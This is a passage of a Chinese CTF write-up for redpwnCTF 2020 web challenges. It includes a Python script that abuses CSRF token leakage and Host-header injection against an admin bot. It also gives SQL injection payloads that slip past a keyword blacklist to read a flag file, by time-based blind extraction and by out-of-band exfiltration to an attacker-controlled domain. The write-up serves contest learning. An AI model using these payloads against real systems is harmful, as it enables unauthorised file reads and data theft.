        if(!viperId.match(v4regex)){
            res.status(400).send("Bad request body");
            return;
        }
        if(!viperId || !csrfToken){
            res.status(400).send("Bad request body");
            return;
        }
        if(sess.isAdmin){
            client.exists('__csrftoken__' + sess.viperId, function(err, reply) {
                if(err){
                    res.status(500).send("Something went wrong");
                    return;
                }
                if (reply === 1) {
                    client.get('__csrftoken__' + sess.viperId, function(err, reply) {
                        if(err){
                            res.status(500).send("Something went wrong");
                            return;
                        }
                        if(reply === Buffer.from(csrfToken, 'base64').toString('ascii')){
                            const randomToken = getRandomInt(1000000, 10000000000);
                            client.set('__csrftoken__' + sess.viperId, randomToken, function(err, reply) {
                                if(err){
                                    res.status(500).send("Something went wrong");
                                    return;
                                }
                            });
                            sess.viperId = viperId;
                            sess.viperName = fs.readFileSync('./flag.txt').toString();
                            res.redirect('/viper/' + encodeURIComponent(sess.viperId));
                        }else{
                            res.status(401).send("Unauthorized");
                        }
                    });
                } else {
                    res.status(401).send("Unauthorized");
                }
            });
        }else{
            res.redirect('/');
        }
     });
    app.listen(31337, () => {
        console.log("express listening on 31337");
    });
可以看到获取flag需要`app.get('/admin/create', function(req,
res)`需要这个路由创建一个页面，把读取的flag.txt放入`viperName`。访问
对应的viperId,就能看到flag。但是这个路由只能admin访问，所以考虑能不能xss让admin访问这个页面，题目描述上给
机器人的地址且说明了只接受`^http://2020.redpwnc.tf:31291/viper/[0-9a-f-]+$`这样的地址，也就是我们创建的页面，从中看看有没有利用点。
源码中viper.ejs（EJS 是一套简单的模板语言，帮你利用普通的 JavaScript 代码生成 HTML
页面。），也就是页面的模板中两个地方是可变的地方` `。
在ejs中，参考 
`#-->
exp
    #!/usr/bin/env python3
    import requests, socket, re
    import uuid
    from urllib.parse import quote
    from base64 import b64encode
    HOST, PORT = "2020.redpwnc.tf", 31291
    #HOST, PORT = "localhost", 31337
    ADMIN_VIPER = str(uuid.uuid4())
    # Create new viper and fetch cookie and Viper ID
    r = requests.get("http://{}:{}/create".format(HOST,PORT), allow_redirects=False)
    viper_id = re.findall("([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", r.text)[0]
    sessid = r.cookies["connect.sid"]
    cookies = {"connect.sid" : sessid}
    # Get the csrf token
    r = requests.get("http://{}:{}/analytics?ip_address=__csrftoken__admin_account".format(HOST, PORT))
    csrftoken = quote(b64encode(r.text.split()[-2].encode()))
    # Inject host header
    payload = ""
    payload += "GET /viper/{} HTTP/1.1rn".format(viper_id)
    payload += "Host: {}:{}\admin\create?x=rn".format(HOST, PORT, ADMIN_VIPER, csrftoken)
    payload += "Accept: */*rn"
    payload += "Cookie: connect.sid={}rn".format(sessid)
    payload += "rn"
    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(payload.encode())
    print(s.recv(32768))
    s.close()
    # Cache request
    r = requests.get("http://{}:{}/viper/{}".format(HOST, PORT, viper_id), cookies=cookies)
    print(r.text)
    print("Send this URL to the admin")
    print("http://{}:{}/viper/{}".format(HOST, PORT, viper_id))
    while True:
        input("nClick to continue fetching http://{}:{}/viper/{} ... ".format(HOST, PORT, ADMIN_VIPER))
        r = requests.get("http://{}:{}/viper/{}".format(HOST, PORT, ADMIN_VIPER), cookies=cookies)
        print(r.text)
提交网址后在访问下admin创建的页面就能看到flag了
参考: 
## web/got-stacks
> This website has great products! Thankfully there are enough products to go
> around; I’m tryna burn some mad stacks for you all.
>
> Site: [got-stacks.2020.redpwnc.tf](https://got-stacks.2020.redpwnc.tf/)
题目是一个类似商品页，可以注测用户，同样也给了源码
    "use strict";
    /*
     *  @REDPWNCTF 2020
     *  @AUTHOR Jim
     */
    const express = require("express");
    const bodyParser = require("body-parser");
    const mysql = require("mysql");
    const request = require("request");
    const url = require("url");
    const fs = require("fs");
    const conn = mysql.createConnection({
        host: "127.0.0.1",
        port: "3306",
        user: "redpwnuser",
        password: "redpwnpassword",
        database: "gotstacks",
        multipleStatements: "true"
    });
    conn.connect({ function(err){
            if(err){
                throw err;
            }else{
                console.log("mysql connection success");
            }
        }
    });
    const KEYWORDS = [
        "union",
        "and",
        "or",
        "sleep",
        "hex",
        "char",
        "db",
        "\\",
        "/",
        "*",
        "load_file",
        "0x",
        "fl",
        "ag",
        "txt",
        "if"
    ];
    const waf = (str) => {
        for(const i in KEYWORDS){
            const key = KEYWORDS[i];
            if(str.toLowerCase().indexOf(key) !== -1){
                return true;
            }
        }
        return false;
    }
    const isValid = (ip) => {
        if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
          return (true)
        }
      return (false)
    }
    const isPrivate = (ip) => {
        const parts = ip.split(".");
        return parts[0] === '10' || 
        (parts[0] === '172' && (parseInt(parts[1], 10) >= 16 && parseInt(parts[1], 10)  0){
                        res.status(400).send("stockID already exists");
                        return;
                    }else{
                        query = "INSERT INTO stock (stockid, name, quantity, vurl) VALUES (" + body.stockid + ", '" + body.name + "', " + body.quantity + ", '" + body.vurl + "');";
                        conn.query(query, function(error, results, fields){
                            res.status(200).send("Success! Record was created");
                        });
                    }
                });
            }else{
                res.status(403).send("Hacking attempt detected");
            }
        }else{
            res.status(400).send("Bad request");
        }
    });
    app.post("/api/notifystock", function(req, res){
        const body = req.body;
        if(body.hasOwnProperty("stockid")){
            let query = "SELECT * FROM stock WHERE stockid = ? LIMIT 1";
            conn.query(query, [req.body.stockid], function(error, results, fields){
                if (error){
                    res.status(500).send("Internal server error");
                    return;
                }
                if(results.length > 0){
                    if(results[0].quantity > 0){
                        res.status(400).send("Stock is not empty!");
                    }else{
                        if(isValid(results[0].vurl.split("/")[0]) && isPrivate(results[0].vurl.split("/")[0])){
                            try {
                                request.get("http://" + results[0].vurl);
                            } catch(err){
                                console.log("get request failed");
                            }
                            res.status(200).send("Thank you! The vendor has been notified");
                        }else{
                            let options = {
                                url: "https://dns.google.com/resolve?name=" + results[0].vurl.split("/")[0] + "&type=A",
                                method: "GET",
                                headers: {
                                    "Accept": "application/json"
                                }
                            }
                            request(options, function(err, dnsRes, body){
                                let jsonRes;
                                try {
                                    jsonRes = JSON.parse(body);
                                }catch(err){
                                    res.status(400).send("Bad request body");
                                    return;
                                }
                                try {
                                    const ip = jsonRes["Answer"][0]["data"];
                                    if(isPrivate(ip)){
                                        try{
                                            request.get("http://" + results[0].vurl);
                                        } catch(err){
                                            console.log("get request failed");
                                        }
                                        res.status(200).send("Thank you! The vendor has been notified");
                                    }else{
                                        res.status(403).send("Thank you! But the address the vendor provided is improper, we will let them know next time we see them");
                                    }
                                }catch(err){
                                    res.status(403).send("Thank you! But the address the vendor provided is improper, we will let them know next time we see them");
                                }
                            })
                        }
                    }
                }else{
                    res.status(404).send("Stockid not found");
                }
            });
        }else{
            res.status(400).send("Bad request");
        }
    });
    app.listen(31337, () => {
        console.log("express listening on 31337");
    });
看过滤的KEYWORDS就大概可以猜出有注入，在insert那有注入，几个参数都可控，都是注册传入的参数。flag从给的源码压缩包中的dockerfile看是要`load_file`读`/home/ctf/flag.txt`，但是几个关键字都给过滤了。这里用预编译语句+16进制，或者用base64绕过这些过滤，有两种方法做接下来，一种外带回显，一种时间盲注。
先说简单的时间盲注
    # (select if((select substr(load_file('/home/ctf/flag.txt'),1,1)) like binary 'f',sleep(6),1))
    {"stockid":"2555","name":"aa","quantity":"0","vurl":"sf'); set @s=(select from_base64('c2VsZWN0IGlmKChzZWxlY3Qgc3Vic3RyKGxvYWRfZmlsZSgnL2hvbWUvY3RmL2ZsYWcudHh0JyksMSwxKSkgbGlrZSBiaW5hcnkgJ2YnLHNsZWVwKDYpLDEp'));PREPARE gsgs FROM @s;EXECUTE gsgs;#"}
    {"stockid":"2560","name":"aa","quantity":"0","vurl":"sf'); set @s=(select x'73656c656374206966282873656c65637420737562737472286c6f61645f66696c6528272f686f6d652f6374662f666c61672e74787427292c312c312929206c696b652062696e617279202766272c736c6565702836292c3129');PREPARE gsgs FROM @s;EXECUTE gsgs;#"}
预期应该是外带，因为还有个路由可以访问vurl，但是有限制需要绕DNS，使得`https://dns.google.com/resolve?name={vurl}&type=A`查询出的结果能过`const
isPrivate` ，即data为192.168开头。
利用
www.192.168.1.1.xip.io会解析到192.168.1.1
nodejs中
request.get(‘[http://域名:www.192.168.1.1.xip.io](http://%E5%9F%9F%E5%90%8D:www.192.168.1.1.xip.io)‘)
会访问到域名，域名绑定到服务器，起个服务监听会显示访问记录
而且`https://dns.google.com/resolve?name=域名:www.192.168.1.1.xip.io&type=A`显示的data为192.168.1.1满足条件
即要写入的`vurl`为
    concat('域名:www.192.168.1.1.xip.io',LOAD_FILE('/home/ctf/ﬂag.txt'))
访问时就会带出flag,把下面语句base64或者16进制套到预编译语句里面，在访问`/api/notifystock`传入{“stockid”:”2333”}，服务器上应该有回显
    INSERT INTO stock (stockid, name, quantity, vurl) VALUES (2333, 'aa', 22, concat('域名:www.192.168.1.1.xip.io',LOAD_FILE('/home/ctf/ﬂag.txt')));
参考: 